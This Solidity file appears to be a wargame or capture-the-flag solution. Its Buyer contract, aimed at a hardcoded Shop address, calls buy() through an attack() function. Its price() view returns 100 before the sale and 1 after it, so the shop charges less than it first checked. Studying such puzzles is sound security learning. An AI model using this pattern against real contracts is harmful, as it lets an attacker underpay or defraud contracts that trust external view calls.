// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IShop {
    function buy() external;
}

abstract contract Shop is IShop {
    bool public isSold;
}

contract Buyer {
    bool isCalled = false;
    Shop s = Shop(0x436ddb20c8d5153e823D64a1E57E64901B63097F);

    function attack() public {
        s.buy();
    }

    function price() public view returns (uint) {
        if (!s.isSold()) {
            return 100;
        } else {
            return 1;
        }
    }
}